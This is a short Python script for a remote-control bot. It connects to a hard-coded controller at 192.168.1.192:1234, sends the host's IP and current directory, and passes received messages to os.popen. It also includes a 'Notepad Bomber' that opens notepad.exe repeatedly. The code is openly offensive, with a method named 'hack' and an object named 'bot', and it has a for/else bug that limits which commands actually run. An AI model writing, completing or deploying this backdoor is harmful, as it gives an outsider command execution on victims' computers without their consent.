import socket
import os

client_ip = socket.gethostbyname(socket.gethostname())

class Client:
    def __init__(self):
        self.host = '192.168.1.192'
        self.port = 1234
        self.server = socket.socket()

    def connect(self):
        self.server.connect((self.host, self.port))
        
    def send(self,text):
        self.server.send(text.encode('UTF-8'))
        
    def recv(self):
        self.msg = self.server.recv(1024)
        return self.msg
        
class Operate:
    def __init__(self):
        self.serv = Client()
        self.serv.connect()
    
    def hack(self):

        self.serv.send('({0}) @{1}> '.format(client_ip,str(os.getcwd())))
        self.msg = self.serv.recv()

        if self.msg.split(' ')[0] == 'NOTE_BOMB':
            #Notepad Bomber
            for i in range(int(self.msg.split(' ')[1])):
                data = os.popen('notepad.exe')
            else:
                data= os.popen(self.msg)
            self.serv.send('Command done!')
run = True

bot = Operate()
while run:
    bot.hack()